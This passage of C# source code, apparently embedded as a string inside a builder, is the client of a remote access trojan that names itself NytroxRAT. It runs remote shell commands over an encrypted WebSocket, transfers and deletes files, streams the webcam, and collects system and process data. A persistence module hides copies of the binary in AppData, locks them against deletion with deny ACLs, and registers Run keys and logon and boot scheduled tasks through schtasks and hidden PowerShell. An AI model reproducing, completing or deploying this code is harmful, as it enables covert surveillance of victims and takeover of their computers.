        catch (Exception ex) { return new FileDownloadResponse { Path=path, Error=ex.Message }; }
    }
    static FileUploadResponse UploadFile(FileUploadRequest req)
    {
        try
        {
            var dir = Path.GetDirectoryName(req.DestinationPath);
            if (dir != null) Directory.CreateDirectory(dir);
            File.WriteAllBytes(req.DestinationPath, Convert.FromBase64String(req.DataBase64));
            return new FileUploadResponse { Success=true };
        }
        catch (Exception ex) { return new FileUploadResponse { Success=false, Error=ex.Message }; }
    }
    static FileDeleteResponse DeletePath(string path)
    {
        try
        {
            if (Directory.Exists(path)) Directory.Delete(path, false); else File.Delete(path);
            return new FileDeleteResponse { Success=true };
        }
        catch (Exception ex) { return new FileDeleteResponse { Success=false, Error=ex.Message }; }
    }

    static async Task RunCommand(ClientWebSocket ws, string command, byte[] key, SemaphoreSlim sendLock, CancellationToken ct)
    {
        var psi = new ProcessStartInfo(""cmd.exe"", ""/C "" + command)
            { RedirectStandardOutput=true, RedirectStandardError=true, UseShellExecute=false, CreateNoWindow=true };
        using var proc = new Process { StartInfo=psi };
        proc.OutputDataReceived += async (_,e) =>
        {
            if (e.Data != null)
                await SafeSend(ws, Enc(new Packet { Type=PktType.CommandOutput, Payload=Json(new CommandOutputPayload { Output=e.Data }) }, key), ct);
        };
        proc.ErrorDataReceived += async (_,e) =>
        {
            if (e.Data != null)
                await SafeSend(ws, Enc(new Packet { Type=PktType.CommandOutput, Payload=Json(new CommandOutputPayload { Output=e.Data, IsError=true }) }, key), ct);
        };
        proc.Start(); proc.BeginOutputReadLine(); proc.BeginErrorReadLine();
        await proc.WaitForExitAsync(ct);
        await SafeSend(ws, Enc(new Packet { Type=PktType.CommandOutput, Payload=Json(new CommandOutputPayload { IsFinished=true }) }, key), ct);
    }

    static SystemStatsPayload GetStats()
    {
        GetMemoryStatus(out var mem);
        var t = (long)mem.ullTotalPhys;
        var f = (long)mem.ullAvailPhys;
        var disks = new List<DiskInfo>();
        foreach (var d in DriveInfo.GetDrives())
            if (d.IsReady) disks.Add(new DiskInfo { Name=d.Name, TotalBytes=d.TotalSize, FreeBytes=d.AvailableFreeSpace });
        return new SystemStatsPayload { MemoryTotalBytes=t, MemoryUsedBytes=t-f, Hostname=Environment.MachineName, OsVersion=Environment.OSVersion.VersionString, Uptime=TimeSpan.FromMilliseconds(Environment.TickCount64), Disks=disks };
    }

    static List<ProcessEntry> GetProcesses()
    {
        var list = new List<ProcessEntry>();
        foreach (var p in Process.GetProcesses().OrderByDescending(x => { try { return x.WorkingSet64; } catch { return 0L; } }).Take(50))
            try { list.Add(new ProcessEntry { Pid=p.Id, Name=p.ProcessName, MemoryBytes=p.WorkingSet64 }); } catch {}
        return list;
    }

    static async Task WebcamLoop(ClientWebSocket ws, int camIndex, byte[] key, SemaphoreSlim sendLock, CancellationToken ct)
    {
        WebcamCapture.Stop();
        WebcamCapture.Start(camIndex);
        try
        {
            while (ws.State == WebSocketState.Open && WebcamCapture.IsRunning && !ct.IsCancellationRequested)
            {
                var frame = await Task.Run(() => WebcamCapture.Capture(camIndex));
                if (frame != null)
                    await SafeSend(ws, Enc(new Packet { Type = PktType.WebcamFrame, Payload = Json(frame) }, key), ct);
                await Task.Delay(200, ct); // ~5fps default
            }
        }
        catch { }
        WebcamCapture.Stop();
    }

    static async Task<Packet?> Recv(ClientWebSocket ws, CancellationToken ct)
    {
        var buf = new byte[20 * 1024 * 1024];  // 20MB — large file uploads
        using var ms = new MemoryStream();
        WebSocketReceiveResult r;
        do { r = await ws.ReceiveAsync(buf, ct); if (r.MessageType == WebSocketMessageType.Close) return null; ms.Write(buf, 0, r.Count); }
        while (!r.EndOfMessage);
        return JsonSerializer.Deserialize<Packet>(ms.ToArray());
    }
    static async Task Send(ClientWebSocket ws, Packet p, CancellationToken ct)
    {
        if (ws.State != WebSocketState.Open) return;
        await ws.SendAsync(JsonSerializer.SerializeToUtf8Bytes(p), WebSocketMessageType.Text, true, ct);
    }
    static string Json<T>(T o) => JsonSerializer.Serialize(o);
    static T From<T>(Packet p) => JsonSerializer.Deserialize<T>(p.Payload)!;
    static Packet Enc(Packet p, byte[] key) { if (!string.IsNullOrEmpty(p.Payload)) p.Payload = PacketCrypto.EncryptJson(p.Payload, key); return p; }
    static void Decrypt(Packet p, byte[] key) { if (!string.IsNullOrEmpty(p.Payload)) try { p.Payload = PacketCrypto.DecryptJson(p.Payload, key); } catch {} }

    [DllImport(""kernel32.dll"")] static extern IntPtr GetConsoleWindow();
    [DllImport(""user32.dll"")]   static extern bool   ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport(""user32.dll"")]   static extern int    GetSystemMetrics(int n);
    [DllImport(""user32.dll"")]   static extern uint   SendInput(uint n, ref INPUT i, int s);
    [DllImport(""user32.dll"")]   static extern IntPtr GetDC(IntPtr h);
    [DllImport(""user32.dll"")]   static extern int    ReleaseDC(IntPtr h, IntPtr hdc);
    [DllImport(""gdi32.dll"")]    static extern IntPtr CreateCompatibleDC(IntPtr hdc);
    [DllImport(""gdi32.dll"")]    static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);
    [DllImport(""gdi32.dll"")]    static extern IntPtr SelectObject(IntPtr hdc, IntPtr obj);
    [DllImport(""gdi32.dll"")]    static extern bool   DeleteObject(IntPtr o);
    [DllImport(""gdi32.dll"")]    static extern bool   DeleteDC(IntPtr hdc);
    [DllImport(""gdi32.dll"")]    static extern bool   BitBlt(IntPtr d, int dx, int dy, int dw, int dh, IntPtr s, int sx, int sy, uint rop);
    [DllImport(""gdi32.dll"")]    static extern bool   StretchBlt(IntPtr d, int dx, int dy, int dw, int dh, IntPtr s, int sx, int sy, int sw, int sh, uint rop);
    [DllImport(""gdi32.dll"")]    static extern int    SetStretchBltMode(IntPtr hdc, int mode);
    [DllImport(""gdi32.dll"")]    static extern int    GetDIBits(IntPtr hdc, IntPtr hbm, uint start, uint lines, byte[] bits, ref BITMAPINFOHEADER bmi, uint usage);
    [DllImport(""kernel32.dll"")] static extern bool   GlobalMemoryStatusEx(ref MEMORYSTATUSEX m);
    static void GetMemoryStatus(out MEMORYSTATUSEX s) { s = new MEMORYSTATUSEX { dwLength=(uint)Marshal.SizeOf<MEMORYSTATUSEX>() }; GlobalMemoryStatusEx(ref s); }

    [StructLayout(LayoutKind.Sequential)] struct BITMAPINFOHEADER { public uint biSize; public int biWidth,biHeight; public ushort biPlanes,biBitCount; public uint biCompression,biSizeImage; public int biXPelsPerMeter,biYPelsPerMeter; public uint biClrUsed,biClrImportant; }
    [StructLayout(LayoutKind.Sequential)] struct MOUSEINPUT    { public int dx,dy; public uint mouseData,dwFlags,time; public IntPtr extra; }
    [StructLayout(LayoutKind.Sequential)] struct KEYBDINPUT    { public ushort wVk,wScan; public uint dwFlags,time; public IntPtr extra; }
    [StructLayout(LayoutKind.Sequential)] struct HARDWAREINPUT { public uint uMsg; public ushort wParamL,wParamH; }
    [StructLayout(LayoutKind.Explicit)]   struct InputUnion    { [FieldOffset(0)] public MOUSEINPUT mi; [FieldOffset(0)] public KEYBDINPUT ki; [FieldOffset(0)] public HARDWAREINPUT hi; }
    [StructLayout(LayoutKind.Sequential)] struct INPUT         { public uint type; public InputUnion u; }
    [StructLayout(LayoutKind.Sequential)] struct MEMORYSTATUSEX { public uint dwLength,dwMemoryLoad; public ulong ullTotalPhys,ullAvailPhys,ullTotalPageFile,ullAvailPageFile,ullTotalVirtual,ullAvailVirtual,ullAvailExtended; }
}

static class Persistence
{
    public static void Install()
    {
        var src = GetSelfPath();
        var primary = BuildInstallPath(Environment.SpecialFolder.LocalApplicationData);
        var backup  = BuildInstallPath(Environment.SpecialFolder.ApplicationData);

        TrySelfHeal(primary, backup);

        if (src != null)
        {
            TryCopy(src, primary);
            TryCopy(src, backup);
            TryHidePath(primary);
            TryHidePath(backup);
            try { LockFile(primary); } catch {}
        }

        var runPath = File.Exists(primary) ? primary : (File.Exists(backup) ? backup : (src ?? """"));
        if (!string.IsNullOrEmpty(runPath))
        {
            TryRegPersist(runPath, backup);
            TryScheduledTask(runPath, backup);
        }
    }

    static string BuildInstallPath(Environment.SpecialFolder root)
    {
        var b = Environment.GetFolderPath(root);
        foreach (var seg in Settings.InstallFolder.Split(new[] { '\\', '/' }, StringSplitOptions.RemoveEmptyEntries))
            b = Path.Combine(b, seg);
        return Path.Combine(b, Settings.InstallExeName);
    }

    static void TrySelfHeal(string primary, string backup)
    {
        try
        {
            if (File.Exists(backup) && !File.Exists(primary))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(primary)!);
                File.Copy(backup, primary, true);
            }
        }
        catch {}
    }

    static void TryCopy(string src, string dest)
    {
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(dest)!);
            if (!File.Exists(dest) || new FileInfo(dest).Length != new FileInfo(src).Length)
                File.Copy(src, dest, overwrite: true);
        }
        catch {}
    }

    static void TryHidePath(string filePath)
    {
        try
        {
            var dir = Path.GetDirectoryName(filePath);
            if (!string.IsNullOrEmpty(dir) && Directory.Exists(dir))
            {
                var da = File.GetAttributes(dir);
                if ((da & FileAttributes.Hidden) == 0)
                    File.SetAttributes(dir, da | FileAttributes.Hidden);
            }
            if (File.Exists(filePath))
            {
                var fa = File.GetAttributes(filePath);
                if ((fa & FileAttributes.Hidden) == 0)
                    File.SetAttributes(filePath, fa | FileAttributes.Hidden);
            }
        }
        catch {}
    }

    static string? GetSelfPath()
    {
        var candidates = new List<string?>();
        try { candidates.Add(Environment.GetCommandLineArgs().FirstOrDefault()); } catch {}
        try { candidates.Add(Environment.ProcessPath); } catch {}
        try { candidates.Add(System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName); } catch {}
        return candidates
            .Where(p => !string.IsNullOrEmpty(p) && File.Exists(p))
            .OrderBy(p => p!.Contains(""Temp"") || p!.Contains("".net"") ? 1 : 0)
            .FirstOrDefault();
    }

    static void LockFile(string path)
    {
        try
        {
            var fi  = new FileInfo(path);
            var acl = fi.GetAccessControl();
            var all = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
            acl.AddAccessRule(new FileSystemAccessRule(all,
                FileSystemRights.Delete | FileSystemRights.Write | FileSystemRights.Modify,
                AccessControlType.Deny));
            fi.SetAccessControl(acl);
        }
        catch {}
    }

    static void TryRegPersist(string primaryExe, string backupExe)
    {
        var keys = new[] {
            (@""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", false),
        };
        foreach (var (key, hklm) in keys)
        {
            try
            {
                var hive = hklm ? Registry.LocalMachine : Registry.CurrentUser;
                using var rk = hive.OpenSubKey(key, writable: true);
                if (rk == null) continue;
                rk.SetValue(Settings.PersistenceKey, ""\"""" + primaryExe + ""\"""");
                if (File.Exists(backupExe) && !string.Equals(primaryExe, backupExe, StringComparison.OrdinalIgnoreCase))
                    rk.SetValue(Settings.PersistenceKey + ""Core"", ""\"""" + backupExe + ""\"""");
                return;
            }
            catch {}
        }
    }

    static void TryScheduledTask(string primaryExe, string backupExe)
    {
        var tn = Settings.PersistenceKey;
        var xml =
            ""<?xml version=\u00221.0\u0022 encoding=\u0022UTF-16\u0022?>"" +
            ""<Task version=\u00221.2\u0022 xmlns=\u0022http://schemas.microsoft.com/windows/2004/02/mit/task\u0022>"" +
            ""<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger>"" +
            ""<BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>"" +
            ""<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"" +
            ""<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>"" +
            ""<RestartOnFailure><Interval>PT1M</Interval><Count>999</Count></RestartOnFailure></Settings>"" +
            ""<Actions><Exec><Command>\u0022"" + primaryExe + ""\u0022</Command></Exec></Actions>"" +
            ""</Task>"";

        string? xmlPath = null;
        foreach (var tp in new[] {
            Path.Combine(Path.GetTempPath(), tn + "".xml""),
            Path.Combine(Path.GetDirectoryName(primaryExe) ?? """", tn + "".xml""),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), tn + "".xml""),
        })
        {
            try { File.WriteAllText(tp, xml, Encoding.Unicode); xmlPath = tp; break; }
            catch {}
        }

        if (xmlPath != null)
        {
            try
            {
                var psi = new ProcessStartInfo(""schtasks.exe"",
                    ""/Create /TN \u0022"" + tn + ""\u0022 /XML \u0022"" + xmlPath + ""\u0022 /F"")
                    { UseShellExecute=false, CreateNoWindow=true, RedirectStandardOutput=true, RedirectStandardError=true };
                using var p = Process.Start(psi);
                p?.WaitForExit(5000);
                try { File.Delete(xmlPath); } catch {}
            }
            catch {}
        }

        try
        {
            var psi = new ProcessStartInfo(""schtasks.exe"",
                ""/Create /TN \u0022"" + tn + ""\u0022 /TR \u0022"" + primaryExe + ""\u0022 /SC ONLOGON /RL HIGHEST /F"")
                { UseShellExecute=false, CreateNoWindow=true, RedirectStandardOutput=true, RedirectStandardError=true };
            using var p = Process.Start(psi);
            p?.WaitForExit(3000);
        }
        catch {}

        if (File.Exists(backupExe) && !string.Equals(primaryExe, backupExe, StringComparison.OrdinalIgnoreCase))
        {
            try
            {
                var psi = new ProcessStartInfo(""schtasks.exe"",
                    ""/Create /TN \u0022"" + tn + ""Bk\u0022 /TR \u0022"" + backupExe + ""\u0022 /SC ONLOGON /RL HIGHEST /F"")
                    { UseShellExecute=false, CreateNoWindow=true, RedirectStandardOutput=true, RedirectStandardError=true };
                using var p = Process.Start(psi);
                p?.WaitForExit(3000);
            }
            catch {}
        }

        try
        {
            var psi = new ProcessStartInfo(""powershell.exe"",
                ""-NonInteractive -WindowStyle Hidden -Command \u0022"" +
                ""$A=New-ScheduledTaskAction -Execute '"" + primaryExe + ""';"" +
                ""$T=New-ScheduledTaskTrigger -AtLogOn;"" +
                ""Register-ScheduledTask -TaskName '"" + tn + ""' -Action $A -Trigger $T -Force\u0022"")
                { UseShellExecute=false, CreateNoWindow=true };
            using var p = Process.Start(psi);
            p?.WaitForExit(5000);
        }
        catch {}
    }
}

static class PacketCrypto
{
    static readonly byte[] Salt = Encoding.UTF8.GetBytes(""NytroxRAT.Salt.v1"");
    public static byte[] DeriveKey(string s)
    {
        using var k = new Rfc2898DeriveBytes(Encoding.UTF8.GetBytes(s), Salt, 100_000, HashAlgorithmName.SHA256);
        return k.GetBytes(32);
    }
    public static string EncryptJson(string json, byte[] key)
    {
        var nonce = RandomNumberGenerator.GetBytes(12);
        var plain = Encoding.UTF8.GetBytes(json);
        var cipher = new byte[plain.Length];
        var tag = new byte[16];
        using var aes = new AesGcm(key, 16);
        aes.Encrypt(nonce, plain, cipher, tag);
        var result = new byte[12 + cipher.Length + 16];
        nonce.CopyTo(result, 0); cipher.CopyTo(result, 12); tag.CopyTo(result, 12 + cipher.Length);
        return Convert.ToBase64String(result);
    }
    public static string DecryptJson(string b64, byte[] key)
    {
        var data = Convert.FromBase64String(b64);
        var nonce = data[..12]; var tag = data[^16..]; var cipher = data[12..^16];
        var plain = new byte[cipher.Length];
        using var aes = new AesGcm(key, 16);
        aes.Decrypt(nonce, cipher, tag, plain);
        return Encoding.UTF8.GetString(plain);
    }
}

class WebcamRequestPayload { public int CameraIndex { get; set; } = 0; }
class WebcamDevice         { public int Index { get; set; } public string Name { get; set; } = """"; }
class WebcamListResp       { public List<WebcamDevice> Devices { get; set; } = new(); }

// Webcam via avicap32 — simple, works on all Windows, no COM registration
static class WebcamCapture
{
    public static volatile bool IsRunning = false;
    private static readonly object _lock = new object();

    public static void Start(int index) => IsRunning = true;
    public static void Stop()           => IsRunning = false;

    // Enumerate all connected cameras using capGetDriverDescriptionA
    public static WebcamListResp ListDevices()
    {
        var resp = new WebcamListResp();
        for (int i = 0; i < 10; i++)
        {
            var name = new System.Text.StringBuilder(256);
            var ver  = new System.Text.StringBuilder(256);
            if (capGetDriverDescriptionA(i, name, 256, ver, 256))
                resp.Devices.Add(new WebcamDevice { Index = i, Name = name.ToString().Trim() });
            else if (i > 0 && resp.Devices.Count == 0) break; // stop early if none found
        }
        return resp;
    }

    [DllImport(""avicap32.dll"", CharSet=CharSet.Ansi)]
    static extern bool capGetDriverDescriptionA(int wDriverIndex, System.Text.StringBuilder lpszName, int cbName, System.Text.StringBuilder lpszVer, int cbVer);

    public static WebcamFramePayload? Capture(int index)
    {
        lock (_lock)
        {
            try
            {
                const int WS_CHILD   = 0x40000000;
                const int WS_VISIBLE = 0x10000000;
                const int WM_CAP_CONNECT       = 0x0400 + 10;
                const int WM_CAP_DISCONNECT    = 0x0400 + 11;
                const int WM_CAP_GRAB_FRAME    = 0x0400 + 60;
                const int WM_CAP_COPY          = 0x0400 + 30;
                const int WM_CAP_SET_PREVIEW   = 0x0400 + 50;
                const int WM_CAP_SET_PREVRATE  = 0x0400 + 52;
                const int WM_CAP_SET_SCALE     = 0x0400 + 53;
                const uint CF_DIB = 8;

                var hwnd = capCreateCaptureWindowA(""wcap"", WS_CHILD, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (hwnd == IntPtr.Zero) return null;
                try
                {
                    if (SendMessageI(hwnd, WM_CAP_CONNECT, index, 0) == 0) return null;
                    SendMessageI(hwnd, WM_CAP_SET_SCALE,    1, 0);
                    SendMessageI(hwnd, WM_CAP_SET_PREVRATE, 66, 0);
                    SendMessageI(hwnd, WM_CAP_SET_PREVIEW,  1, 0);
                    Thread.Sleep(800); // warm-up
                    SendMessageI(hwnd, WM_CAP_GRAB_FRAME, 0, 0);
                    Thread.Sleep(150);
                    SendMessageI(hwnd, WM_CAP_COPY, 0, 0);

                    // Read DIB from clipboard
                    if (!OpenClipboard(IntPtr.Zero)) return null;
                    byte[]? imgData = null;
                    try
                    {
                        var hDib = GetClipboardData(CF_DIB);
                        if (hDib != IntPtr.Zero)
                        {
                            var ptr  = GlobalLock(hDib);
                            if (ptr != IntPtr.Zero)
                            {
                                try
                                {
                                    int size = (int)(uint)GlobalSize(hDib);
                                    var dib  = new byte[size];
                                    Marshal.Copy(ptr, dib, 0, size);
                                    // Build BMP: BITMAPFILEHEADER + DIB data
                                    using var bms = new MemoryStream();
                                    int fileSize   = 14 + size;
                                    int dataOffset = 54;
                                    bms.Write(new byte[]{0x42,0x4D});
                                    bms.Write(BitConverter.GetBytes(fileSize));
                                    bms.Write(new byte[4]);
                                    bms.Write(BitConverter.GetBytes(dataOffset));
                                    bms.Write(dib);
                                    imgData = bms.ToArray();
                                }
                                finally { GlobalUnlock(hDib); }
                            }
                        }
                    }
                    finally { CloseClipboard(); }

                    SendMessageI(hwnd, WM_CAP_DISCONNECT, 0, 0);
                    if (imgData == null) return null;
                    return new WebcamFramePayload { ImageBase64 = Convert.ToBase64String(imgData), Width = 640, Height = 480 };
                }
                finally { DestroyWindow(hwnd); }
            }
            catch { return null; }
        }
    }

    [DllImport(""avicap32.dll"", CharSet=CharSet.Ansi)]
    static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWnd, int nID);
    [DllImport(""user32.dll"")] static extern int  SendMessageI(IntPtr hWnd, int Msg, int wParam, int lParam);
    [DllImport(""user32.dll"")] static extern bool DestroyWindow(IntPtr hWnd);
    [DllImport(""user32.dll"")] static extern bool OpenClipboard(IntPtr hWndNewOwner);
    [DllImport(""user32.dll"")] static extern bool CloseClipboard();
    [DllImport(""user32.dll"")] static extern IntPtr GetClipboardData(uint uFormat);
    [DllImport(""kernel32.dll"")] static extern IntPtr GlobalLock(IntPtr hMem);
    [DllImport(""kernel32.dll"")] static extern bool   GlobalUnlock(IntPtr hMem);
    [DllImport(""kernel32.dll"")] static extern uint   GlobalSize(IntPtr hMem);
}

enum PktType { AgentRegister,AgentRegistered,ClientConnect,ClientConnected,Disconnect,Ping,Pong,ScreenFrame,ScreenRequest,MouseMove,MouseClick,KeyPress,FileListRequest,FileListResponse,FileDownloadRequest,FileDownloadResponse,FileUploadRequest,FileUploadResponse,FileDeleteRequest,FileDeleteResponse,CommandExecute,CommandOutput,SystemStats,ProcessList,WebcamRequest,WebcamFrame,WebcamStop,WebcamListRequest,WebcamListResponse }
class Packet { [JsonPropertyName(""type"")] public PktType Type{get;set;} [JsonPropertyName(""sessionId"")] public string SessionId{get;set;}=""""; [JsonPropertyName(""payload"")] public string Payload{get;set;}=""""; [JsonPropertyName(""timestamp"")] public long Timestamp{get;set;}=DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(); }
class ScreenFramePayload   { public int Width{get;set;} public int Height{get;set;} public string ImageBase64{get;set;}=""""; public string Format{get;set;}=""bmp""; }
class WebcamFramePayload   { public string ImageBase64{get;set;}=""""; public int Width{get;set;} public int Height{get;set;} }
class MouseMovePayload     { public int X{get;set;} public int Y{get;set;} }
class MouseClickPayload    { public int X{get;set;} public int Y{get;set;} public int Button{get;set;} public bool IsDown{get;set;} }
class KeyPressPayload      { public int VirtualKey{get;set;} public bool IsDown{get;set;} }
class FileListRequest      { public string Path{get;set;} = @""C:\""; }
class FileListResponse     { public string Path{get;set;}=""""; public List<FileEntry> Entries{get;set;}=new(); public string? Error{get;set;} }
class FileEntry            { public string Name{get;set;}=""""; public string FullPath{get;set;}=""""; public bool IsDirectory{get;set;} public long Size{get;set;} public DateTime LastModified{get;set;} }
class FileDownloadRequest  { public string Path{get;set;}=""""; }
class FileDownloadResponse { public string Path{get;set;}=""""; public string? DataBase64{get;set;} public string? Error{get;set;} }
class FileUploadRequest    { public string DestinationPath{get;set;}=""""; public string DataBase64{get;set;}=""""; }
class FileUploadResponse   { public bool Success{get;set;} public string? Error{get;set;} }
class FileDeleteRequest    { public string Path{get;set;}=""""; }
class FileDeleteResponse   { public bool Success{get;set;} public string? Error{get;set;} }
class CommandExecutePayload{ public string Command{get;set;}=""""; }
class CommandOutputPayload { public string Output{get;set;}=""""; public bool IsError{get;set;} public bool IsFinished{get;set;} }
class SystemStatsPayload   { public double CpuPercent{get;set;} public long MemoryUsedBytes{get;set;} public long MemoryTotalBytes{get;set;} public string Hostname{get;set;}=""""; public string OsVersion{get;set;}=""""; public TimeSpan Uptime{get;set;} public List<DiskInfo> Disks{get;set;}=new(); }
class DiskInfo             { public string Name{get;set;}=""""; public long TotalBytes{get;set;} public long FreeBytes{get;set;} }
class ProcessEntry         { public int Pid{get;set;} public string Name{get;set;}=""""; public double CpuPercent{get;set;} public long MemoryBytes{get;set;} }
";
}
